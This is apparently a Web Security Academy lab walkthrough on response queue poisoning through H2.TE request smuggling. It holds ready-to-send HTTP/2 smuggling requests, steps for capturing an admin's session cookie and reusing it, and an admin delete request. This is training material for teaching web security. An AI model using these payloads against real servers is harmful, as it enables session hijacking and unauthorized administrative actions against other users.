## Response queue poisoning via H2.TE request smuggling

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

### Solution Steps
1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request. POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured. POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net Note Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header.
4. Send the request to poison the response queue. You will receive the 404 response to your own request.
5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. Note If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.
6. Copy the session cookie and use it to send the following request: GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
7. Send the request repeatedly until you receive a 200 response containing the admin panel.
8. In the response, find the URL for deleting carlos ( /admin/delete?username=carlos ), then update the path in your request accordingly. Send the request to delete carlos and solve the lab.

### Key Payloads
- `carlos`
- `/admin`
- `POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED`
- `POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net`
- `\r\n\r\n`
- `Host`
- `GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE`
- `/admin/delete?username=carlos`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: request_smuggling

---
*Source: PortSwigger Web Security Academy*
